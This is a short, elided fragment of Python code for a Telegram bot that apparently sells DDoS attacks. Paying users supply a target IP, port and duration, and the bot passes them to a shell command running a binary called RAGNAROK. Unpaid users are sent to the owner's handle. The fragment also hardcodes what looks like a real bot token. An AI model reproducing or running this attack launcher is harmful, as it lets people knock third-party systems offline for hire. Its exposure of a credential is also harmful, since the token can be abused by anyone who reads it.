...
TOKEN = ''7284251491:AAHigd61Sd_vaTjbQI-o2oh3cTDVk9Wunpc"
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./RAGNAROK {target_ip} {target_port} {duration} 100")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @@RohitRWA0.*", parse_mode='Markdown')  # Contact owner message
            return
